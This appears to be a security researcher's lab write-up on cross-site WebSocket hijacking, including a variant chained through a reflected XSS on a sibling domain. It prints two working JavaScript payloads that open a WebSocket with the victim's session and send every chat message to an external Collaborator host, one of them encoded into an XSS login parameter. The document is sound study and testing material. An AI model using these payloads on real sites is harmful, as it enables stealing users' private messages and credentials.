![image](https://beren-obsidian-images.imgix.net/075e8ebed08d65d132e429f615204e0b.webp)
### *Cross-site WebSocket hijacking (CSWH)*
This vulnerable website has a live chat feature that uses WebSockets, which relies on a cookie with the following values: 
```
[
    {
        "domain": "sub.vulnerable-website.com",
        "name": "session",
        "value": "VjAB8RjXPABXbBqi4Cxf2UgKnKzBb0mI",
        "path": "/",
        "secure": true,
        "session": false,
        "sameSite":"none"
        "expirationDate": 1702080719,
        "httpOnly": true,
        "hostOnly": true,
        "firstPartyDomain": "vulnerable-website.com",
    }
]
```

An attacker can craft a script that establishes a WebSocket connection to a vulnerable website from a cross-origin context. They might then trick a victim into running this script by embedding it in a malicious website or a link. When the victim visits this malicious page while logged into the vulnerable site, the script opens a WebSocket connection to the target chat application using the victim's session cookies.

The key point here is that the WebSocket protocol, in its initial handshake request, automatically includes any cookies associated with its domain. If these cookies lack appropriate `SameSite` attributes (or if they are explicitly set to `"SameSite": "None"`), they can be sent in cross-site requests, making them vulnerable to CSRF attacks.
```
<script>
	document.addEventListener("DOMContentLoaded", function() {
		let ws = new WebSocket("wss://vulnerable-website.com/chat");

		ws.onopen = function() {
			console.log("WebSocket connection established");
			ws.send("READY");
		};

		ws.onmessage = function(event) {
			fetch('https://pqjzmw3hry0nyikk2fxos0mkyb46sv.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
		};

		ws.onerror = function(error) {
			// Handle any errors that occur
			console.log("WebSocket error: " + error.message);
		};

		ws.onclose = function(event) {
			// WebSocket connection is closed
			console.log("WebSocket connection closed: " + event.code);
		};
	});
</script>
```

Once the WebSocket connection is established, the script sends a command ("READY") to the server. The server responds with chat messages, which are then processed by the attacker’s script. For each received message, the script can make an HTTP request to an external server, such as the Burp Collaborator client. This request can include the contents of the chat message, effectively ex-filtrating data from the victim’s session to the attacker.
### *CSWH via sibling domain with XSS vulnerability*
`vulnerable-website.com` authenticates WebSockets via cookies with the `SameSite=Strict` setting. All WebSocket messages are sent in clear text to the user after authenticating with this cookie. 

After thoroughly auditing `vulnerable-website.com`, I stumbled across a .js file that contained a link to a sibling domain. This sibling domain (`cms-vulnerable-website.com`) contained a login form which was vulnerable to XSS, as it reflected the `username` input on a failed login. 

I crafted an XSS payload which contained a TLD redirect using `document.location` to submit the form with the XSS in the `username` query parameter. This XSS allowed me to embed a WebSocket connection from the sibling domain. This is done on an exploit server and sent to the victim:
```
<script>
const baseUrl = "https://cms-vulnerable-website.com/login?";
const xss = "document.addEventListener('DOMContentLoaded',function(){let e=new WebSocket('wss://vulnerable-website.com/chat');e.onopen=function(){console.log('WebSocket connection established'),e.send('READY')},e.onmessage=function(e){fetch('https://aaomx4mlr72vimknz5jmzqha218swh.oastify.com',{method:'POST',mode:'no-cors',body:e.data})},e.onerror=function(e){console.log('WebSocket error: '+e.message)},e.onclose=function(e){console.log('WebSocket connection closed: '+e.code)}})"
const queryParams = "username=admin<scr"+"ipt>" + encodeURIComponent(xss) + "</scr"+"ipt>&password=kdfjg";

const url = baseUrl + queryParams
document.location = url;
</script>
```

The victim is directed to the login page with the XSS and opens the WebSocket connection. Because `vulnerable-website.com` is using the `Access-Control-Allow-Origin: cms-vulnerable-website.com` header, then we can bypass the `SameSite=Strict` cookie settings for authenticating the WebSocket connection as the user.

This means we can open a WebSocket connection directly on the sibling domain via the XSS vulnerability, and transmit the data received to a Burp Collaborator client or DNS server. This allowed me to see chat logs of the victim, and extract the victim's log in credentials from a private message.
### *Resources*
- https://javascript.info/websocket#:~:text=To%20open%20a%20websocket%20connection,It's%20like%20HTTPS%20for%20websockets
- https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
- https://book.hacktricks.xyz/pentesting-web/websocket-attacks
### *Tools*
- [enumeration](https://github.com/PalindromeLabs/STEWS) Discover, fingerprint and search for known vulnerabilities in WebSockets automatically.
- [WSSiP](https://github.com/nccgroup/wssip) Provides a user interface to capture, intercept, send custom messages and view all WebSocket and Socket.IO communications between the client and server.
- [wsrepl](https://github.com/doyensec/wsrepl)
- [websocketking](https://websocketking.com/) Communicate with other websites using WebSockets.